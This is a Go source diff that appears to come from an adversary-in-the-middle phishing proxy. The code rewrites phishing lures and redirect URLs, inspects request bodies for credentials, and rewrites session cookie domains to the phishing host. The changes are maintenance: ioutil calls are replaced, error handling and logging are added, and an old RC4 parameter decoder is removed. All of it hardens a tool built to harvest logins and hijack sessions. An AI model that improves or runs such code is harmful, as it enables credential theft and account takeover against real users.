@@ -19,7 +19,6 @@ import (
 	"fmt"
 	"html"
 	"io"
-	"io/ioutil"
 	"net"
 	"net/http"
 	"net/url"
@@ -425,7 +424,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										session.RedirectURL = l.RedirectUrl
 									}
 									if session.RedirectURL != "" {
-										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
+										if rurl, ok := p.replaceUrlWithPhished(session.RedirectURL); ok {
+											session.RedirectURL = rurl
+										} else {
+											log.Debug("redirect URL (lure) has no phishing mapping, left unchanged: %s", session.RedirectURL)
+										}
 									}
 									session.PhishLure = l
 									log.Debug("redirect URL (lure): %s", session.RedirectURL)
@@ -496,7 +499,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 
 									if _, err := os.Stat(index_found); !os.IsNotExist(err) {
-										html, err := ioutil.ReadFile(index_found)
+										html, err := os.ReadFile(index_found)
 										if err == nil {
 
 											html = p.injectOgHeaders(l, html)
@@ -560,9 +563,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								log.Warning("lure: redirector path escapes redirectors dir, refusing: %s", req_path)
 								return p.blockRequest(req)
 							}
-	
+
 							if _, err := os.Stat(path); !os.IsNotExist(err) {
-								fdata, err := ioutil.ReadFile(path)
+								fdata, err := os.ReadFile(path)
 								if err == nil {
 									//log.Debug("ext: %s", filepath.Ext(req_path))
 									mime_type := getContentType(req_path, fdata)
@@ -667,9 +670,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
 					req.Header.Set(p.getHomeDir(), o_host)
-					body, err := ioutil.ReadAll(req.Body)
+					body, err := io.ReadAll(req.Body)
 					if err == nil {
-						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+						req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
 
 						// patch phishing URLs in JSON body with original domains
 						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
@@ -856,7 +859,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 
 						}
-						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+						req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
 
@@ -1004,7 +1007,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
+				if phished_domain, ok := p.replaceHostWithPhished(ck.Domain); ok {
+					ck.Domain = phished_domain
+				}
 				resp.Header.Add("Set-Cookie", ck.String())
 			}
 			if ck.String() != "" {
@@ -1012,7 +1017,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			// modify received body
-			body, err := ioutil.ReadAll(resp.Body)
+			body, err := io.ReadAll(resp.Body)
 
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
@@ -1188,7 +1193,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+				resp.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
 			}
 
 			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
@@ -1409,41 +1414,6 @@ func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
 			}
 		}
 	}
-	/*
-		for k, v := range vals {
-			if len(k) == 2 {
-				// possible rc4 encryption key
-				if len(v[0]) == 8 {
-					enc_key = v[0]
-					break
-				}
-			}
-		}
-
-		if len(enc_key) > 0 {
-			for k, v := range vals {
-				if len(k) == 3 {
-					enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
-					if err == nil {
-						dec_params := make([]byte, len(enc_vals))
-
-						c, _ := rc4.NewCipher([]byte(enc_key))
-						c.XORKeyStream(dec_params, enc_vals)
-
-						params, err := url.ParseQuery(string(dec_params))
-						if err == nil {
-							for kk, vv := range params {
-								log.Debug("param: %s='%s'", kk, vv[0])
-
-								session.Params[kk] = vv[0]
-							}
-							ret = true
-							break
-						}
-					}
-				}
-			}
-		}*/
 	return ret
 }
 
@@ -1544,7 +1514,11 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 		hostname := parts[0]
 		port := 443
 		if len(parts) == 2 {
-			port, _ = strconv.Atoi(parts[1])
+			if p, err := strconv.Atoi(parts[1]); err == nil {
+				port = p
+			} else {
+				log.Debug("TLSConfigFromCA: failed to parse port from host '%s', defaulting to %d", host, port)
+			}
 		}
 
 		tls_cfg := &tls.Config{}
@@ -1645,7 +1619,9 @@ func (p *HttpProxy) httpsWorker() {
 				return
 			}
 
-			hostname, _ = p.replaceHostWithOriginal(hostname)
+			if orig_hostname, ok := p.replaceHostWithOriginal(hostname); ok {
+				hostname = orig_hostname
+			}
 
 			req := &http.Request{
 				Method: "CONNECT",
@@ -1950,6 +1926,11 @@ func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port in
 	return nil
 }
 
+// dumbResponseWriter adapts a raw net.Conn into an http.ResponseWriter so the
+// goproxy server can write directly to the hijacked TLS connection. Only Write
+// and Hijack are ever exercised on this path; Header and WriteHeader are part of
+// the interface contract but must never be invoked here, so they panic
+// deliberately to surface any unexpected use during development.
 type dumbResponseWriter struct {
 	net.Conn
 }
